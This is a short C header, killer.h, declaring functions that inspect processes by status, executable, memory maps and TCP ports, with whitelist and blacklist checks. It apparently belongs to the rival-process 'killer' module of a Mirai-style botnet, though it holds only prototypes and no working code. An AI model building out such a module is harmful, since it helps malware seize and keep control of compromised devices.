#ifndef KILLER_H
#define KILLER_H

#include <sys/types.h>

void killer_main(void);
void killer_stat(void);
void killer_exe(void);
void killer_ps(void);
void killer_maps(void);
void killer_tcp(void);
int is_whitelisted(pid_t pid, const char *cmdline, const char *exe, const char *maps);
int is_blacklisted(const char *cmdline, const char *exe, const char *maps);
int is_whitelisted_port(int port);

#endif
